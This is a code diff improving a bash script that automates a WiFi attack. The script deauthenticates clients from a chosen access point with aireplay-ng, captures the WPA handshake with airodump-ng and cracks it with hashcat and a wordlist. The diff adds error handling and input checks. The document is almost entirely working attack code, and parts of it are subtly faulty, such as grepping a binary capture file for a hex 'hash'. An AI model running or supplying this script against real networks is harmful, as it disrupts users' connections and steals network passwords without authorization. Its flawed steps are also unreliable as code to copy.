@@ -1,5 +1,7 @@
 #!/bin/bash
 
+set -e
+
 # Check if running as root
 if [ "$(id -u)" != "0" ]; then
   echo "Please run as root"
@@ -37,17 +39,17 @@ fi
 # Display list of access points and prompt user to choose one
 echo "Select an access point:"
 PS3='> '
-while IFS= read -r line; do echo "$line"; done <<< "$aps" | select ap; do
+while IFS= read -r line; do
+    aps_list+=("$line")
+    echo "$line"
+done <<< "$aps"
+select ap in "${aps_list[@]}"; do
     if [ -n "$ap" ]; then
-        bssid_tmp=$(echo "$ap" | awk '{print $1}')
-        channel_tmp=$(echo "$ap" | awk '{print $2}')
+        bssid=$(echo "$ap" | awk '{print $1}')
+        channel=$(echo "$ap" | awk '{print $2}')
         break
     fi
 done
-
-# Set bssid and channel variables
-bssid="$bssid_tmp"
-channel="$channel_tmp"
 
 # Perform deauthentication attack to capture handshake
 echo "Performing deauthentication attack on $bssid (channel $channel)..."
@@ -56,9 +58,15 @@ aireplay-ng --deauth 10 -a "$bssid" mon0 &
 # Start capturing handshakes for target network
 echo "Capturing handshakes for $bssid (channel $channel)..."
 airodump-ng -c "$channel" --bssid "$bssid" -w handshake mon0 &
+capture_pid=$!
 
 # Wait for handshake capture to complete
-wait
+if ! wait "$capture_pid"; then
+    echo "Error: Handshake capture failed. Exiting."
+    pkill aireplay-ng
+    airmon-ng stop mon0
+    exit 1
+fi
 
 # Stop deauthentication attack
 pkill aireplay-ng
@@ -67,13 +75,20 @@ pkill aireplay-ng
 hash=$(grep -oP '([0-9A-Fa-f]{2}:){15}[0-9A-Fa-f]{2}' handshake-01.cap | head -n 1)
 
 if [ -z "$hash" ]; then
-    echo "No hash found in handshake file. Exiting."
+    echo "Error: Hash not found in handshake file. Exiting."
     airmon-ng stop mon0
     exit 1
 fi
 
 # Ask user for wordlist to use for cracking
-read -r -p "Please enter the path to the wordlist to use for cracking: " wordlist
+while true; do
+    read -r -p "Please enter the path to the wordlist to use for cracking: " wordlist
+    if [ -f "$wordlist" ]; then
+        break
+    else
+        echo "Error: File not found. Please enter a valid path."
+    fi
+done
 
 # Crack the hash using hashcat
 echo "Cracking hash..."
@@ -81,3 +96,4 @@ hashcat -m 2500 handshake-01.cap "$wordlist"
 
 # Stop monitor mode
 airmon-ng stop mon0
+
